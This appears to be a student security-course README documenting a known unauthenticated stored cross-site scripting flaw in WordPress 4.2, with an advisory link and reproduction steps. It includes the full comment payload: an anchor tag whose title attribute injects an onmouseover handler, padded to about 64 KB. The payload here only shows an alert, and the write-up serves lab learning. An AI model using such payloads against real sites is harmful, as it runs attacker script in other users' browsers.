# Codepath-Week-7

1. WordPress <= 4.2 - Unauthenticated Stored Cross-Site Scripting (XSS)
- Summary: 
	- Tested in version: 4.2
	- Fixed in version: 4.2.1
	- Type of Vulnerability: XSS
	- Sourcecode/walkthrough: https://klikki.fi/adv/wordpress2.html
- Steps to recreate:
	- Create a comment on website with a string following the format: 

					<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
<img src="XSS - Unauthenticated Stored XSS.gif" width="800">
